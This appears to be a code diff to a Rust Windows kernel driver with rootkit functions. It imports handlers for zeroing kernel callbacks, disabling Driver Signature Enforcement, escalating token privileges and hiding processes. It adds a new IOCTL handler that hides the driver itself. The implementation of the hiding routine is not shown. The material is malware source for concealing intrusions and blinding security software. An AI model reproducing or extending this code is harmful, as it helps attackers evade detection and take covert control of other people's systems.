@@ -19,8 +19,8 @@ use winapi::{km::wdm::IO_PRIORITY::IO_NO_INCREMENT, shared::ntstatus::{STATUS_BU
 use winapi::km::wdm::{DRIVER_OBJECT, IoCreateDevice, PDEVICE_OBJECT, IoCreateSymbolicLink, IRP_MJ, DEVICE_OBJECT, IRP, IoCompleteRequest, IoGetCurrentIrpStackLocation, IoDeleteSymbolicLink, IoDeleteDevice, DEVICE_TYPE};
 use winapi::shared::ntdef::{NTSTATUS, UNICODE_STRING, FALSE, NT_SUCCESS, TRUE};
 use winapi::shared::ntstatus::{STATUS_SUCCESS, STATUS_UNSUCCESSFUL};
-use common::{IOCTL_PROCESS_PROTECT_REQUEST, IOCTL_PROCESS_UNPROTECT_REQUEST, IOCTL_PROCESS_TOKEN_PRIVILEGES_REQUEST, IOCTL_CALLBACKS_ENUM_REQUEST, IOCTL_CALLBACKS_ZERO_REQUEST, IOCTL_DSE_ENABLE_DISABLE_REQUEST, IOCTL_PROCESS_HIDE_REQUEST, CallBackInformation, TargetProcess, TargetCallback, DriverSignatureEnforcement};
-use crate::{callbacks::{PsSetCreateProcessNotifyRoutineEx, process_create_callback, PcreateProcessNotifyRoutineEx, search_loaded_modules, get_loaded_modules}, process::{find_psp_set_create_process_notify, hide::hide_process}};
+use common::{IOCTL_PROCESS_PROTECT_REQUEST, IOCTL_PROCESS_UNPROTECT_REQUEST, IOCTL_PROCESS_TOKEN_PRIVILEGES_REQUEST, IOCTL_CALLBACKS_ENUM_REQUEST, IOCTL_CALLBACKS_ZERO_REQUEST, IOCTL_DSE_ENABLE_DISABLE_REQUEST, IOCTL_PROCESS_HIDE_REQUEST, IOCTL_DRIVER_HIDE_REQUEST, CallBackInformation, TargetProcess, TargetCallback, DriverSignatureEnforcement};
+use crate::{callbacks::{PsSetCreateProcessNotifyRoutineEx, process_create_callback, PcreateProcessNotifyRoutineEx, search_loaded_modules, get_loaded_modules}, process::{find_psp_set_create_process_notify, hide::{hide_process, hide_driver}}};
 use crate::process::{protect_process, unprotect_process};
 use crate::string::create_unicode_string;
 use crate::token::enable_all_token_privileges;
@@ -94,7 +94,7 @@ pub extern "system" fn driver_entry(driver: &mut DRIVER_OBJECT, _: &UNICODE_STRI
 }
 
 
-pub extern "system" fn dispatch_device_control(_device_object: &mut DEVICE_OBJECT, irp: &mut IRP) -> NTSTATUS {
+pub extern "system" fn dispatch_device_control(device_object: &mut DEVICE_OBJECT, irp: &mut IRP) -> NTSTATUS {
     
     let stack = IoGetCurrentIrpStackLocation(irp);
     let control_code = unsafe { (*stack).Parameters.DeviceIoControl().IoControlCode };
@@ -276,6 +276,18 @@ pub extern "system" fn dispatch_device_control(_device_object: &mut DEVICE_OBJEC
                 status = STATUS_SUCCESS;
             } else {
                 log::error!("Hide process failed");
+                status = STATUS_UNSUCCESSFUL;
+            }
+        },
+        IOCTL_DRIVER_HIDE_REQUEST => {
+            log::info!("IOCTL_DRIVER_HIDE_REQUEST");
+           
+            if let Ok(_result) = hide_driver(device_object) {
+                log::info!("Driver hidden successful");
+                information = 0;
+                status = STATUS_SUCCESS;
+            } else {
+                log::error!("Failed to hide driver");
                 status = STATUS_UNSUCCESSFUL;
             }
         },
